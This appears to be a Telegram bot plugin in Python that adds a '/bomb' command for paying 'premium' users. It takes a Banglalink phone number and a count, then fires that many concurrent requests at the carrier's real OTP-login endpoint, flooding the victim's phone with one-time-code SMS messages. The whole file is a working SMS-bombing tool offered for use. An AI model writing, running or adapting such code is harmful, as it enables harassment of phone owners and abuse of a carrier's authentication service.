import aiohttp
from pyrogram import Client,filters
import asyncio
async def send_requests(number,amount):
	async with aiohttp.ClientSession()as C:
		A=[]
		for F in range(amount):D={'mobile':number};A.append(C.post('https://web-api.banglalink.net/api/v1/user/otp-login/request',json=D))
		E=await asyncio.gather(*A)
		for B in E:
			if B.status==200:0
			else:print(f"Error sending request: {B.status}")

@Client.on_message(filters.command('bomb'))
async def A(client,message):
	A=message
	with open(file='plugins/ExtraMod/users/premium.txt',mode='r+',encoding='utf-8')as D:E=D.readlines()
	if str(A.from_user.id)+'\n'in E:
		try:H,B,C=A.text.split();B=B.strip();C=int(C.strip())
		except ValueError:return await A.reply('<b>⎚ Use <code>/bomb </code>[number] [amount]</b>')
		except Exception as F:return await A.reply(f"<b>⎚ Error: {str(F)}</b>")
		if len(B)==11 and str(B).startswith(('019','014')):G=await A.reply('<b>⎚ `Request Sending...`</b>');await send_requests(B,C);await G.edit('<b>Finished</b>')
		else:await A.reply('<b>Please Use Banglalink Number Without +880</b>')
	else:return await A.reply(f"<b>Only For Premium Members</b>")
